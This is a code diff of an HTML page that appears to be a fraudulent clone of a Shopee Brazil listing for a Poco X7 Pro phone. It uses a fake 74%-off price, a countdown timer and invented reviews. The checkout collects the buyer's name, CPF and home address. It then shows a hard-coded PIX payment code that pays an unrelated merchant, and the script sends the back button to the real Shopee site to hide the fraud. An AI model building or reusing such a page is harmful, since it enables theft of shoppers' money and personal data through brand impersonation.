@@ -28,7 +28,6 @@
         .product-card { background: white; padding: 15px; margin-bottom: 8px; position: relative; }
         .price-row { color: var(--shopee); font-size: 24px; font-weight: 500; display: flex; align-items: baseline; gap: 5px; }
         .old-price { color: #999; text-decoration: line-through; font-size: 14px; margin-bottom: 5px; }
-
         .discount-tag { background: rgba(238, 77, 45, 0.1); color: #ee4d2d; font-size: 11px; font-weight: bold; padding: 2px 4px; border-radius: 2px; margin-left: 8px; text-transform: uppercase; }
 
         .product-title { font-size: 15px; color: #222; line-height: 1.4; font-weight: 400; }
@@ -56,7 +55,6 @@
         .product-ratings-header__stats-avg { color: var(--shopee); font-weight: bold; font-size: 12px; }
         .product-ratings-header__stats-count { color: #757575; font-size: 12px; }
         .product-ratings-header__see-all { color: var(--shopee); font-size: 13px; text-decoration: none; display: flex; align-items: center; gap: 4px; }
-        .product-ratings-header__arrow { fill: var(--shopee); width: 10px; height: 10px; }
 
         .review-item { background: white; padding: 15px; border-bottom: 1px solid #f2f2f2; }
         .user-info { display: flex; align-items: center; gap: 8px; font-size: 13px; font-weight: 500; }
@@ -73,9 +71,7 @@
         .input-box { width: 100%; border: 1px solid #ddd; padding: 12px; border-radius: 4px; margin-bottom: 10px; font-size: 14px; outline: none; }
         .cep-row { display: flex; gap: 8px; margin-bottom: 10px; }
         .btn-cep { background: var(--shopee); color: white; border: none; padding: 0 15px; border-radius: 4px; font-size: 12px; cursor: pointer; font-weight: bold; }
-
         .btn-voltar { background: #eee; color: #555; border: none; width: 100%; height: 45px; border-radius: 4px; margin-top: 8px; font-weight: bold; cursor: pointer; font-size: 14px; }
-
         .garantia-shopee { display: flex; flex-direction: column; align-items: center; margin-bottom: 10px; color: var(--shopee); font-weight: 500; font-size: 12px; line-height: 1.2; text-align: center; }
         .garantia-shopee i { font-size: 20px; margin-bottom: 4px; }
     </style>
@@ -84,25 +80,17 @@
 
     <div class="top-nav">
         <a href="https://shopee.com.br/"><i class="fas fa-arrow-left" style="color:var(--shopee); font-size: 18px;"></i></a>
-        <div class="search-container">
-            <input type="text" class="search-bar" placeholder="Buscar na Shopee">
-        </div>
+        <div class="search-container"><input type="text" class="search-bar" placeholder="Buscar na Shopee"></div>
         <i class="fas fa-shopping-cart" style="color:var(--shopee);"></i>
     </div>
 
-    <div class="main-slider">
-        <img src="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4">
-    </div>
+    <div class="main-slider"><img src="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4"></div>
 
     <div class="flash-sale-banner">
-        <div class="flash-sale-left">
-            <i class="fas fa-bolt"></i> OFERTA RELÂMPAGO
-        </div>
+        <div class="flash-sale-left"><i class="fas fa-bolt"></i> OFERTA RELÂMPAGO</div>
         <div class="timer-box">
             <span style="font-size:12px; margin-right:5px;">TERMINA EM</span>
-            <div class="timer-unit" id="h">01</div> :
-            <div class="timer-unit" id="m">30</div> :
-            <div class="timer-unit" id="s">00</div>
+            <div class="timer-unit" id="h">01</div> : <div class="timer-unit" id="m">30</div> : <div class="timer-unit" id="s">00</div>
         </div>
     </div>
 
@@ -114,10 +102,7 @@
     <div class="product-card">
         <div class="old-price">R$2.299,00</div>
         <div class="price-row">R$599,00 <span class="discount-tag">74% OFF</span> <span style="font-size:12px; color:#999; margin-left:10px;">6,4mil Vendidos</span></div>
-        <div class="product-title">
-            <span class="indicator-tag">Indicado</span>
-            Xiaomi Poco X7 PRO 5G Global Version, Processador Dimensity 8400-Ultra, Câmera 64MP OIS, Bateria 6000mAh
-        </div>
+        <div class="product-title"><span class="indicator-tag">Indicado</span> Xiaomi Poco X7 PRO 5G Global Version, Processador Dimensity 8400-Ultra...</div>
     </div>
 
     <div class="shop-section">
@@ -132,61 +117,28 @@
         <a href="https://shopee.com.br/shop/1078992312" class="shop-btn">Ver Loja</a>
     </div>
 
-    <div class="section-box">
-        <div class="section-title">Especificações do Produto</div>
-        <div class="spec-row"><div class="spec-label">Marca</div><div class="spec-value">Xiaomi / POCO</div></div>
-        <div class="spec-row"><div class="spec-label">Modelo</div><div class="spec-value">Poco X7 Pro 5G</div></div>
-        <div class="spec-row"><div class="spec-label">Processador</div><div class="spec-value">MediaTek Dimensity 8400-Ultra (4nm)</div></div>
-        <div class="spec-row"><div class="spec-label">Memória RAM</div><div class="spec-value">8GB / 12GB LPDDR5X</div></div>
-        <div class="spec-row"><div class="spec-label">Armazenamento</div><div class="spec-value">256GB / 512GB UFS 4.0</div></div>
-    </div>
-
-    <div class="section-box">
-        <div class="section-title">Descrição do Produto</div>
-        <div class="desc-text">
-            O Poco X7 Pro 5G redefine o conceito de custo-benefício. Equipado com o novíssimo processador MediaTek Dimensity 8400-Ultra de 4nm, ele entrega desempenho de nível flaghsip para jogos pesados e multitarefa intensa.
-
-            Destaques Principais:
-            • Tela AMOLED CrystalRes de 120Hz para fluidez máxima.
-            • Câmera Principal de 64MP com Estabilização Óptica (OIS).
-            • Carregamento Ultra Rápido de 90W.
-            • Bateria massiva de 6000mAh para até 2 dias de uso.
-            • Tecnologia 5G Global de última geração.
-
-            Acompanha na caixa: Smartphone Poco X7 Pro, Carregador Turbo 90W, Cabo USB-C, Capa de Proteção e Manual do Usuário.
-        </div>
-    </div>
-
     <div class="product-ratings-header__wrapper">
         <div class="product-ratings-header__left">
-            <div class="product-ratings-header-title">
-                <div class="product-ratings-header__label typo-m14">Avaliações do produto</div>
-            </div>
-            <a href="https://shopee.com.br/Xiaomi-Poco-X6-Pro-5G-Global-Version-i.1078992312.23292818042" style="text-decoration:none;">
-                <div class="product-ratings-header__stats typo-l12">
-                    <div class="" data-key="rating-star">
-                        <img src="https://deo.shopeemobile.com/shopee/shopee-mobilemall-live-sg/rating/8221e9a289d23c23cef9.svg" class="VUvows P5OR7v">
-                        <img src="https://deo.shopeemobile.com/shopee/shopee-mobilemall-live-sg/rating/8221e9a289d23c23cef9.svg" class="VUvows P5OR7v">
-                        <img src="https://deo.shopeemobile.com/shopee/shopee-mobilemall-live-sg/rating/8221e9a289d23c23cef9.svg" class="VUvows P5OR7v">
-                        <img src="https://deo.shopeemobile.com/shopee/shopee-mobilemall-live-sg/rating/8221e9a289d23c23cef9.svg" class="VUvows P5OR7v">
-                        <img src="https://deo.shopeemobile.com/shopee/shopee-mobilemall-live-sg/rating/e795434a48ef42f9a279.svg" class="VUvows P5OR7v">
-                    </div>
-                    <div class="product-ratings-header__stats-avg typo-l12">4.9/5</div>
-                    <div class="product-ratings-header__stats-count typo-l12">(2mil resenhas)</div>
+            <div class="product-ratings-header-title">Avaliações do produto</div>
+            <a href="https://shopee.com.br/shop/1078992312/item/23292818042/rating" style="text-decoration:none; display:flex; align-items:center; gap:5px;">
+                <div class="product-ratings-header__stats">
+                    <img src="https://deo.shopeemobile.com/shopee/shopee-mobilemall-live-sg/rating/8221e9a289d23c23cef9.svg" class="VUvows">
+                    <img src="https://deo.shopeemobile.com/shopee/shopee-mobilemall-live-sg/rating/8221e9a289d23c23cef9.svg" class="VUvows">
+                    <img src="https://deo.shopeemobile.com/shopee/shopee-mobilemall-live-sg/rating/8221e9a289d23c23cef9.svg" class="VUvows">
+                    <img src="https://deo.shopeemobile.com/shopee/shopee-mobilemall-live-sg/rating/8221e9a289d23c23cef9.svg" class="VUvows">
+                    <img src="https://deo.shopeemobile.com/shopee/shopee-mobilemall-live-sg/rating/e795434a48ef42f9a279.svg" class="VUvows">
                 </div>
+                <div class="product-ratings-header__stats-avg">4.9/5</div>
+                <div class="product-ratings-header__stats-count">(2mil resenhas)</div>
             </a>
         </div>
-        <a class="product-ratings-header__see-all" href="https://shopee.com.br/Xiaomi-Poco-X6-Pro-5G-Global-Version-i.1078992312.23292818042">
-            Ver tudo
-            <svg enable-background="new 0 0 11 11" viewBox="0 0 11 11" role="img" class="stardust-icon stardust-icon-arrow-right product-ratings-header__arrow">
-                <path stroke="none" d="m2.5 11c .1 0 .2 0 .3-.1l6-5c .1-.1.2-.3.2-.4s-.1-.3-.2-.4l-6-5c-.2-.2-.5-.1-.7.1s-.1.5.1.7l5.5 4.6-5.5 4.6c-.2.2-.2.5-.1.7.1.1.3.2.4.2z"></path>
-            </svg>
-        </a>
+        <a class="product-ratings-header__see-all" href="https://shopee.com.br/shop/1078992312/item/23292818042/rating">Ver tudo <i class="fas fa-chevron-right" style="font-size:10px;"></i></a>
     </div>
+
     <div class="review-item">
         <div class="user-info">luizadriano871 <span style="color:#999; font-size:10px;">• 2 dias atrás</span></div>
         <div style="color:#ee4d2d; font-size:10px; margin:4px 0;">⭐⭐⭐⭐⭐</div>
-        <div class="review-text">Aparelho espetacular! O processador é um monstro. Entrega rápida!</div>
+        <div class="review-text">Aparelho espetacular! O processador é um monstro.</div>
         <div class="review-media">
             <video autoplay loop muted playsinline src="https://down-bs-br.vod.susercontent.com/api/v4/11110103/mms/br-11110103-6kfkr-mc6f0gc92ch3fd.16000051752497615.mp4"></video>
             <img src="https://down-br.img.susercontent.com/file/br-11134103-7r98o-mc6f0urdynjb78">
@@ -196,12 +148,8 @@
     <div style="height: 60px;"></div>
     <div class="footer">
         <div style="width:120px; display:flex;">
-            <div style="flex:1; display:flex; flex-direction:column; align-items:center; justify-content:center; color:var(--shopee); border-right:1px solid #eee;">
-                <i class="far fa-comment-dots"></i><span style="font-size:9px;">Chat</span>
-            </div>
-            <div style="flex:1; display:flex; flex-direction:column; align-items:center; justify-content:center; color:var(--shopee);">
-                <i class="fas fa-cart-plus"></i><span style="font-size:9px;">Carrinho</span>
-            </div>
+            <div style="flex:1; display:flex; flex-direction:column; align-items:center; justify-content:center; color:var(--shopee); border-right:1px solid #eee;"><i class="far fa-comment-dots"></i><span style="font-size:9px;">Chat</span></div>
+            <div style="flex:1; display:flex; flex-direction:column; align-items:center; justify-content:center; color:var(--shopee);"><i class="fas fa-cart-plus"></i><span style="font-size:9px;">Carrinho</span></div>
         </div>
         <button class="btn-buy" onclick="openModal()">Compre Agora</button>
     </div>
@@ -209,14 +157,11 @@
     <div id="modal" class="modal">
         <div class="modal-content">
             <div id="selection-screen">
-                <div class="modal-header">
-                    <img src="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4" style="width: 80px; height: 80px; object-fit: cover; border-radius: 4px; margin-right: 15px;">
-                    <div style="display: inline-block; vertical-align: top;">
-                        <div style="color:var(--shopee); font-size:20px; font-weight:500;">R$599,00</div>
-                        <div style="font-size:12px; color:#888;">Estoque: 1071</div>
-                    </div>
+                <div style="display:flex; align-items:center; margin-bottom:15px;">
+                    <img src="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4" style="width:80px; height:80px; border-radius:4px;">
+                    <div style="margin-left:15px;"><div style="color:var(--shopee); font-size:20px; font-weight:500;">R$599,00</div><div style="font-size:12px; color:#888;">Estoque: 1071</div></div>
                 </div>
-                <span style="font-size:14px; color:#555; margin-bottom:10px; display:block; margin-top: 15px;">Escolha a Cor</span>
+                <p style="font-size:14px; margin-bottom:10px;">Escolha a Cor</p>
                 <div class="options-grid">
                     <button class="opt-btn" onclick="selectVar(this)">AMARELO</button>
                     <button class="opt-btn" onclick="selectVar(this)">PRETO</button>
@@ -224,11 +169,10 @@
                     <button class="opt-btn" onclick="selectVar(this)">IRON MAN</button>
                 </div>
                 <button class="btn-buy" style="width:100%; height:45px; border-radius:4px; margin-top:20px;" onclick="goToForm()">PRÓXIMO</button>
-                <button class="btn-voltar" onclick="document.getElementById('modal').style.display='none'">VOLTAR PARA O SITE</button>
+                <button class="btn-voltar" onclick="document.getElementById('modal').style.display='none'">VOLTAR</button>
             </div>
 
             <div id="form-screen" style="display:none;">
-                <h4 style="margin-bottom:15px; text-align:center;">Dados para Entrega</h4>
                 <input type="text" id="nome" class="input-box" placeholder="Nome Completo">
                 <input type="tel" id="cpf" class="input-box" placeholder="CPF">
                 <div class="cep-row">
@@ -239,7 +183,6 @@
                 <input type="text" id="bairro" class="input-box" placeholder="Bairro">
                 <input type="text" id="cidade" class="input-box" placeholder="Cidade / Estado">
                 <button class="btn-buy" style="width:100%; height:45px; border-radius:4px;" onclick="finalizar()">GERAR PIX</button>
-                <button class="btn-voltar" onclick="document.getElementById('form-screen').style.display='none'; document.getElementById('selection-screen').style.display='block';">VOLTAR E MUDAR COR</button>
             </div>
 
             <div id="pix-screen" style="display:none; text-align:center;">
@@ -256,27 +199,11 @@
     </div>
 
     <script>
-        let totalSeconds = (1 * 3600) + (30 * 60);
-        function updateTimer() {
-            const h = Math.floor(totalSeconds / 3600);
-            const m = Math.floor((totalSeconds % 3600) / 60);
-            const s = totalSeconds % 60;
-            document.getElementById('h').innerText = String(h).padStart(2, '0');
-            document.getElementById('m').innerText = String(m).padStart(2, '0');
-            document.getElementById('s').innerText = String(s).padStart(2, '0');
-            if(totalSeconds > 0) totalSeconds--;
-        }
-        setInterval(updateTimer, 1000);
-        updateTimer();
-
-        history.pushState(null, null, location.href);
-        window.onpopstate = function () {
-            window.location.href = "https://shopee.com.br/";
-        };
-
-        let selectedVar = null;
+        const PIX_VALUE = "00020101021226580014br.gov.bcb.pix0136db0cbb53-17be-449c-89c8-9bffd8f6c7b55204000053039865406599.005802BR5917LOJA OFICIAL ONIX6009SAO PAULO62070503***630453AF";
+        
         function openModal() { document.getElementById('modal').style.display='block'; }
-
+        
+        let selectedVar = null;
         function selectVar(btn) {
             document.querySelectorAll('.opt-btn').forEach(b => b.classList.remove('selected'));
             btn.classList.add('selected');
@@ -284,30 +211,50 @@
         }
 
         function goToForm() {
-            if(!selectedVar) { alert("Selecione uma cor."); return; }
+            if(!selectedVar) return alert("Selecione uma cor.");
             document.getElementById('selection-screen').style.display='none';
             document.getElementById('form-screen').style.display='block';
         }
 
-         async function buscarCEP() {
+        async function buscarCEP() {
             const cepVal = document.getElementById('cep').value.replace(/\D/g, '');
-            if(cepVal.length !== 8) { alert("Digite um CEP válido."); return; }
-            try {
+            if(cepVal.length === 8) {
                 const res = await fetch(`https://viacep.com.br/ws/${cepVal}/json/`);
                 const data = await res.json();
-                if(data.erro) throw new Error();
-                document.getElementById('rua').value = data.logradouro;
-                document.getElementById('bairro').value = data.bairro;
-                document.getElementById('cidade').value = data.localidade + " / " + data.uf;
-            } catch (e) { alert("CEP não encontrado."); }
+                if(!data.erro) {
+                    document.getElementById('rua').value = data.logradouro;
+                    document.getElementById('bairro').value = data.bairro;
+                    document.getElementById('cidade').value = data.localidade + " / " + data.uf;
+                }
+            }
         }
 
         function finalizar() {
-            if(document.getElementById('nome').value === "") { alert("Preencha seus dados."); return; }
+            if(!document.getElementById('nome').value) return alert("Preencha os dados.");
+            // Injeção do PIX na tag
+            let modalContent = document.querySelector('.modal-content').innerHTML;
+            document.querySelector('.modal-content').innerHTML = modalContent.replaceAll('{PIX_PRONTO}', PIX_VALUE);
+            
             document.getElementById('form-screen').style.display='none';
             document.getElementById('pix-screen').style.display='block';
         }
+
+        let totalSeconds = 5400;
+        setInterval(() => {
+            const h = Math.floor(totalSeconds / 3600);
+            const m = Math.floor((totalSeconds % 3600) / 60);
+            const s = totalSeconds % 60;
+            if(document.getElementById('h')) {
+                document.getElementById('h').innerText = String(h).padStart(2, '0');
+                document.getElementById('m').innerText = String(m).padStart(2, '0');
+                document.getElementById('s').innerText = String(s).padStart(2, '0');
+            }
+            if(totalSeconds > 0) totalSeconds--;
+        }, 1000);
+
+        history.pushState(null, null, location.href);
+        window.onpopstate = () => { window.location.href = "https://shopee.com.br/"; };
     </script>
 </body>
 </html>
-  
+                    
